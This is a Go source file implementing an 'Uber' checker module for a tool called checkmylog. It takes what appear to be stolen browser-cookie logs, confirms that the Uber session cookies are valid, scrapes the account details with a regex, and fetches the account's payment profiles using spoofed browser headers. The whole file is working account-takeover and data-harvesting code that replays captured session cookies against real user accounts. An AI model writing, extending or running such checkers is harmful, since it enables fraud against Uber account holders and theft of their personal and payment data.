package uber

import (
	"encoding/json"
	"github.com/restartfu/checkmylog/checkmylog"
	http "github.com/saucesteals/fhttp"
	"io"
	"log"
	"net/url"
	"strings"
)

// Uber is the checker for UBER.
type Uber struct{}

// Name ...
func (Uber) Name() string {
	return "UBER"
}

// URL ...
func (Uber) URL() url.URL {
	return url.URL{Scheme: "https", Host: "uber.com"}
}

// Options ...
func (Uber) Options() checkmylog.Opts {
	return checkmylog.Opts{
		Proxied: false,
	}
}

// Capture ...
func (Uber) Capture(l checkmylog.Log) (checkmylog.Account, bool) {
	details, ok := validate(l)
	if !ok {
		return nil, false
	}

	req, err := newPaymentProfilesRequest()
	if err != nil {
		return nil, false
	}

	resp, err := l.Do(req)
	if err != nil || resp.StatusCode != 200 {
		return nil, false
	}
	var data paymentData

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, false
	}

	err = json.Unmarshal(body, &data)
	if err != nil {
		return nil, false
	}

	return account{details: details, paymentProfiles: data.Data.PaymentProfiles}, true
}

// validate validates the log.
// It returns the account details and a boolean indicating if the log is valid.
func validate(l checkmylog.Log) (accountDetails, bool) {
	nopDetails := accountDetails{}
	req, err := http.NewRequest("GET", baseURL, nil)
	if err != nil {
		return nopDetails, false
	}

	if len(l.Cookies(req.URL)) <= 0 {
		return nopDetails, false
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")

	resp, err := l.Do(req)
	if err != nil {
		return nopDetails, false
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nopDetails, false
	}

	bodyText := strings.ReplaceAll(string(body), "\n", "")
	matches := accountDetailsRegex.FindStringSubmatch(bodyText)
	if len(matches) < 2 {
		return nopDetails, false
	}
	detailsRaw := strings.ReplaceAll(matches[1], "\\u0022", "\"")
	var accDetails accountDetails
	err = json.Unmarshal([]byte(detailsRaw), &accDetails)
	if err != nil {
		panic(err)
		return nopDetails, false
	}

	return accDetails, true
}

// newPaymentProfilesRequest creates a new request to get the payment profiles.
func newPaymentProfilesRequest() (*http.Request, error) {
	var data = strings.NewReader(`{}`)
	req, err := http.NewRequest("POST", paymentProfilesURL, data)
	if err != nil {
		log.Fatal(err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Language", "en-CA,en-US;q=0.7,en;q=0.3")
	req.Header.Set("Referer", "https://wallet.uber.com/")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-csrf-token", "x")
	req.Header.Set("Origin", "https://wallet.uber.com")
	req.Header.Set("Sec-GPC", "1")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("TE", "trailers")

	return req, nil
}
